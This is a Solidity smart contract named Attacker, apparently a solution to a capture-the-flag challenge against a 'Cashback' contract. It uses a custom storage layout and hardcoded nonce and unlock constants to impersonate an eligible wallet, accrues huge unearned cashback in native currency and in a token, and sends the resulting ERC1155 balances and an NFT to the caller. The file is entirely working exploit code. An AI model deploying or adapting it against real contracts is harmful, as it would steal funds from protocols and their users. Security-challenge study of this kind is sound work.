// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ICashback} from "src/ICashback.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

contract Attacker layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba03  {

    uint256 public nonce;
    ICashback target;
    IERC721 NFT;

    address constant currency = 0x13AaF3218Facf57CfBf5925E15433307b59BCC37;
    address constant nativeCurrency = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 public constant consumeNonce = 10000;
    bool public constant isUnlocked = true;

    
    function setUp(ICashback _target) public {
        target = _target;
        NFT = IERC721(target.superCashbackNFT());
    }
    function attackNative() public {
        target.accrueCashback(nativeCurrency, 100000 ether);
        IERC1155(address(target)).safeTransferFrom(
            address(this),
            msg.sender,
            uint256(uint160(nativeCurrency)),
            IERC1155(address(target)).balanceOf(address(this), uint256(uint160(nativeCurrency))),
            hex""
        );
        NFT.transferFrom(address(this), msg.sender, uint256(uint160(address(this))));
    }
    function attack() public {
        target.accrueCashback(currency, 50000000 ether);
        IERC1155(address(target)).safeTransferFrom(
            address(this),
            msg.sender,
            uint256(uint160(currency)),
            IERC1155(address(target)).balanceOf(address(this), uint256(uint160(currency))),
            hex""
        );
        NFT.transferFrom(address(this), msg.sender, uint256(uint160(address(this))));
    }

    function setNonce() public {
        nonce = 9999;
    }
}